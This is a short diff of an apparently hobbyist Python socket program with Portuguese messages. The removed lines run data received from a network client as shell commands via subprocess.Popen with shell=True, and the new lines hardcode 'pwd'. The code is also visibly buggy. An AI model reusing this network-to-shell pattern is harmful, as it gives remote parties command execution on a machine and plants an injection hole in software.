@@ -24,7 +24,7 @@ def listen(client):
                 return
             else:
                 #threading.Thread(target=cmd, args=(client, data))
-                cmd(client, data.encode())
+                cmd(client, data)
 
     except Exception as Error:
         print('ERRO: ', Error)
@@ -32,7 +32,7 @@ def listen(client):
 
 def cmd(client, data):
     try:
-        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+        proc = subprocess.Popen(b"pwd", shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         output = proc.stdout.read #+ proc.stderr.read
         client.send("Recebeu!!!")
     except Exception as Error:
